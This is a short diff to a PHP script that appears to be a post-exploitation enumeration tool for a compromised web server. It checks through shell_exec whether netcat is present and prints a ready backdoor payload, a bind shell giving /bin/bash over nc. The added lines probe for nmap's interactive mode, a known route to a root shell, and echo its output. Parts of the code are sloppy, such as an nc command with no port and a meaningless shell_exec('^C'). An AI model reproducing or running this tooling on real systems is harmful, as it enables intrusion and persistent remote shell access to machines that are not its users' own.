@@ -104,10 +104,16 @@ function AppnDir(){
 		echo "<p><b>Crontab jobs: </b></p>";
 		echo "<p>No crontabs available</p>";
 	}
-	if($rservs = shell_exec("nc -h")){
+	if(shell_exec("nc -h")){
 		echo "<strong>Important: </strong>";
 		echo "<p><b>NetCat(nc) Is available.</b></p>";
 		echo "<p>Backdoor payload: nc -vnlp -e /bin/bash</p>";
+	}
+	if($nmapI = shell_exec("nmap --interactive")){
+		echo "<strong>Important: </strong>";
+		echo "<p><b>Nmap interactive Shell is available.</b><p>";
+		echo "<p>".$nmapI."</p>";
+		shell_exec("^C"); 
 	}
 }
 # Function calls
